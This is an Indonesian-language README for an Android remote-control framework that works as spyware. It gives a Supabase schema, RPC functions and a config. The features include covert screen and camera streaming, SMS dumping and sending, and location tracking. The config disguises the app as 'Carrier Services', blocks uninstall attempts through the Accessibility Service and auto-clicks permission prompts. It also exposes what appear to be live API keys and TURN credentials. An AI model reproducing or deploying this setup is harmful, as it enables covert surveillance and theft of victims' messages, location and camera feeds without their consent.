# FPSOverlay Remote Control Framework

Project ini adalah framework remote control Android dengan dashboard berbasis Web (Dsociety) dan backend Supabase.

## Fitur Utama
- **WebRTC Live Stream:** Layar (Screen Mirror) dan Kamera (Depan/Belakang).
- **Remote Commands:** Lock Screen, Flashlight, Vibrate, SMS Dump, SMS Send, Location Tracking.
- **Protection:** Anti-Uninstall berbasis Accessibility Service.
- **Dynamic Configuration:** Perubahan pengaturan tanpa perlu install ulang APK.

---

## Panduan Supabase (Backend)

Jalankan perintah SQL berikut di **SQL Editor** Supabase Anda:

### 1. Skema Tabel

```sql
-- Tabel untuk daftar perangkat
CREATE TABLE devices (
    id TEXT PRIMARY KEY,
    name TEXT,
    brand TEXT,
    model TEXT,
    manufacturer TEXT,
    sdk_version INT,
    version TEXT,
    online BOOLEAN DEFAULT true,
    last_seen TIMESTAMPTZ,
    status JSONB,
    authorized_emails TEXT[]
);

-- Tabel untuk log dan data media (Base64)
CREATE TABLE device_data (
    id BIGSERIAL PRIMARY KEY,
    device_id TEXT REFERENCES devices(id) ON DELETE CASCADE,
    data_type TEXT, -- 'logs', 'camera', 'screenshot', 'sms', 'location'
    content TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Tabel untuk pengiriman perintah (Commands)
CREATE TABLE commands (
    id BIGSERIAL PRIMARY KEY,
    device_id TEXT REFERENCES devices(id) ON DELETE CASCADE,
    cmd TEXT,
    created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Tabel untuk signaling WebRTC
CREATE TABLE signaling (
    device_id TEXT PRIMARY KEY REFERENCES devices(id) ON DELETE CASCADE,
    type TEXT,
    offer TEXT,
    answer TEXT,
    candidates_web JSONB DEFAULT '[]',
    candidates_device JSONB DEFAULT '[]',
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- Tabel untuk konfigurasi dinamis (CRITICAL)
CREATE TABLE app_settings (
    key TEXT PRIMARY KEY,
    value JSONB
);
```

### 2. Fungsi RPC (Ice Candidates)

Fungsi ini digunakan untuk menambah kandidat ICE ke dalam array JSONB secara atomik.

```sql
CREATE OR REPLACE FUNCTION append_web_candidate(dev_id TEXT, new_candidate TEXT)
RETURNS void AS $$
BEGIN
  UPDATE signaling
  SET candidates_web = candidates_web || jsonb_build_array(new_candidate)
  WHERE device_id = dev_id;
END;
$$ LANGUAGE plpgsql;

CREATE OR REPLACE FUNCTION append_device_candidate(dev_id TEXT, new_candidate TEXT)
RETURNS void AS $$
BEGIN
  UPDATE signaling
  SET candidates_device = candidates_device || jsonb_build_array(new_candidate)
  WHERE device_id = dev_id;
END;
$$ LANGUAGE plpgsql;
```

---

## Konfigurasi Dinamis (`app_settings`)

Untuk mengubah pengaturan APK tanpa update, masukkan row berikut ke tabel `app_settings`:
- **Key:** `app_config`
- **Value (JSONB):**

```json
{
  "metered_api_key": "45baaf2cec8fdb459d24d0ad09cf2810f7a4",
  "stream_bitrate_min": 50000,
  "stream_bitrate_max": 600000,
  "stream_fps": 12,
  "flash_interval": 300,
  "image_quality": 40,
  "notif_title": "Carrier Services",
  "notif_text": "System synchronization active",
  "heartbeat_interval": 30000,
  "status_interval": 30000,
  "anti_uninstall_keywords": [
    "uninstall", "uninstal", "hapus", "bongkar", "copot", "pemasangan", "delete", "instalan", "menghapus"
  ],
  "protected_packages": [
    "packageinstaller", "settings", "security", "safecenter", "permissioncontroller"
  ],
  "perm_ids": [
    "com.android.permissioncontroller:id/permission_allow_button",
    "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
    "com.android.permissioncontroller:id/permission_allow_always_button",
    "android:id/button1"
  ],
  "perm_keywords": [
    "Allow", "Izinkan", "While using", "Saat aplikasi", "Allow all the time", 
    "Izinkan sepanjang waktu", "Yes", "Ya", "OK", "Permit", "Bolehkan", "Sudah", 
    "Terima", "Accept", "Tetap izinkan", "Always allow",
    "Start now", "Mulai sekarang", "Start recording", "Mulai merekam", 
    "Grant", "Confirm", "Izinkan saja", "Don't show again"
  ],
  "ice_servers": [
    {
      "urls": ["turn:global.relay.metered.ca:80", "turn:global.relay.metered.ca:443"],
      "username": "33500225b9105e9ce477d7f4",
      "credential": "97UioiShU85IkOua"
    }
  ]
}
```

---

## Logika Migrasi & Sinkronisasi
1.  **APK:** Saat startup, `SupabaseManager` akan memanggil `syncDynamicConfig()`.
2.  Data dari Supabase akan menimpa nilai default di `Config.java`.
3.  **Web:** `StreamManager.js` akan mengambil data dari tabel yang sama sebelum melakukan negosiasi WebRTC.
4.  Jika Supabase gagal diakses, APK akan menggunakan **Hardcoded Fallback** yang ada di `Config.java`.
